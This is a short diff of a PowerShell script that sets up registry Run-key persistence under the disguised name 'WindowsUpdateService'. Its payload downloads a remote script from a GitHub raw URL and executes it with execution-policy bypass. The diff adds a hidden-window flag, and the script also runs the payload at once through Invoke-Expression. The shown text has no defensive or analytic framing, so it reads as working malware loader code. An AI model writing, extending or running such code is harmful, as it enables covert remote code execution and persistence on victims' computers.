@@ -5,7 +5,7 @@ $regPaths = @(
     "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
 )
 
-$payload = "powershell -ep bypass -c `"[PowerShell]::Create().AddScript((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/PowerShellScripts/autorun.ps1')).Invoke()`""
+$payload = "powershell -w hidden -ep bypass -c `"[PowerShell]::Create().AddScript((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/PowerShellScripts/autorun.ps1')).Invoke()`""
 $regName = "WindowsUpdateService"
 
 foreach ($path in $regPaths) {
@@ -20,3 +20,4 @@ foreach ($path in $regPaths) {
 
 
 Invoke-Expression $payload
+
